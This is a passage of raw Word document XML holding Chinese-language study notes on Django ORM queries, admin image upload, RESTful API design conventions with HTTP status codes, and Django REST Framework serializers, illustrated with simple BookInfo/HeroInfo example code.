      </w:r>
    </w:p>
    <w:p w14:paraId="14FAEB9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对应get, filter, exclude参数中可以写查询条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792CBB3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格式: 属性名__条件名=值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441667F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注意：可以写多个查询条件，默认是且的关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9F8A3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F对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4585E96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用于查询时字段之间的比较</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D58A9B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from django.db.models import F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D74281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Q对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C32432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用于查询时条件之间的逻辑关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F464E3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from django.db.models import Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773345C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&amp;(与) |(或) ~(非)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0509E81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聚合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6819CF1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聚合类: from django.db.models import Count, Sum, Avg, Max, Min</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412A6E3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aggregate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D1F03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排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F86FF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排序默认是升序，降序在排序字段前加-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EBA98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order_by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD44BD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关联查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6DFA6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1. 查询和指定对象关联的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482C1AF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由1查多</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F13052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一对象.多类名小写_set.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BA062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例：book.heroinfo_set.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368A131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由多查1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0AC01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多对象.外键属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39789D7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例：hero.hbook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633E511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2. 通过模型类进行关联查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B9142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查图书(一)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4601B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一类.objects.get|filter(多类名__字段__条件=值)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBDA20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例：books = BookInfo.objects.filter(heroinfo__hcomment__contains='八')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FCBAE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 xml:space="preserve">    查英雄(多)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9A449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多类.objects.filter(外键属性__字段__条件=值)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F475D6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例：heros = HeroInfo.objects.filter(hbook__bread__gt=30)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD729DC"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1.13admin站点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702FDDE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="4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上传图片</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5320A30E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="4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Django自带文件存储系统，可以直接通过Admin站点进行图片的上传，默认上传的文件保存在服务器本地。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6DB6E9" w14:textId="7760AED9" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="4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使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480EE84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1）在配置文件中设置配置项MEDIA_ROOT='上传文件的保存目录'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF0D6C2"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2）定义模型类时，图片字段的类型使用ImageField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786BC5D0" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="38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3）迁移生成表并在admin.py注册模型类，直接登录Admin站点就可以进行图片上传</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5990A7C9" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="380" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>2.DRF框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D81A12A" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="38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2.1目的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1110854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利用DRF框架快速的实现RestAPI接口的设计</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D4BC8B"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2.2RestfulAPI接口设计风格</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25528ECD"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关键点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212CBA2C"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1）url地址尽量使用名词，不要使用动词</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281FAD9B"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2）请求url地址采用不同的请求方式执行不同的操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47816AB4"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GET(获取)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269E170A"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POST(新增)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4119A97A"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PUT(修改)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39450DFB"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DELETE(删除)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2097D3F0"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3）过滤参数可以放在查询字符串中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1952079A" w14:textId="29363B90"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4）响应数据返回&amp;响应状态码</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98"/>
        <w:gridCol w:w="1755"/>
      </w:tblGrid>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="04FFC353" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AFA5005" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126418">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>状态码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FDCCF0B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126418">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="65204047" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62F4F109"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200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69CFD4B6"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获取或修改成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="6982C407" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="214ECECB"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201</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="676003E8"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新增成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="501A558E" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58A73E32"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204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2309F575"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删除成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="26FC4703" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D511070"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404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49F06916"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资源不存在</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="34EC1F6C" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="373D05A6"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400</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B0E76B0"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客户请求有误</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="0ECA1F2C" w14:textId="77777777" w:rsidTr="00267D1E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="617E31C6"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500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="414853F8" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126418">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>服务器错误</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B1A98CC" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5）响应数据的格式：json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4664C4B1"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lastRenderedPageBreak/>
        <w:t>2.3django自定义RestAPI接口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529B1AF1"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RestAPI接口核心工作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0768D1E5" w14:textId="77777777" w:rsidR="00D8288D"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1.将数据库数据序列化为前端所需要的格式，并返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DA9A70" w14:textId="23657C93"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2.将前端发送的数据反序列化为模型类对象，并保存到数据库中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37636FE3"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2.4DRF框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC82FF4"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2.4.1作用：大大提高RestAPI接口开发效率</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E49156"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2.5序列化器Serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A86716"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2.5.1功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C877E7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进行数据的序列化和反序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350BCCBD"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2.5.2序列化器的定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BA2DE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继承自</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>serializers.Serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217FB616"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from rest_framework import serializers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B792230"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serializers.Serializer:DRF</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架中所有序列化器的父类，定义序列化器类时，可以直接继承此类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31216E1F"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serializers.ModelSerializer:Serializer</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类的子类，在父类的基础山，添加一些功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8A5734"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class </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>序列化器类名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(serializers.Serializer):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58404BB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 </w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = serializers.</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字段名</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>选项参数</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A5A5E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序列化器对象创建：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EDAD43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序列化器类</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(instance=&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例对象</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&gt;,data=&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>&gt;,**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0BB2B3"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2.5.3序列化功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D32E6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说白了就是将实例对象转换为字典数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA81A2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1</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）序列化单个对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B004A3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book = BookInfo.objects.get(id=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252C3072"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serializer = BookInfoSerializer(book)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4B40AF"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res = json.dumps(serializer.data,ensure_ascii=False,indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FD470E"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）序列化多个对象，其实就是添加了一个</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>many</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9B9086"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books = BookInfo.objects.all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E040D24"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serializer = BookInfoSerializer(books,many=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7906B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res = json.dumps(serializer.data,ensure_ascii=False,indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A037A8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3</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）关联对象的嵌套序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6280D4B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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将关联对象序列化为关联对象的主键</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036DC030"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hbook = serializers.PrimaryKeyRelatedField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>read_only=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2472920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lastRenderedPageBreak/>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>采用指定的序列化器将关联对象进行序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A59174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hbook = BookInfoSerializer(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
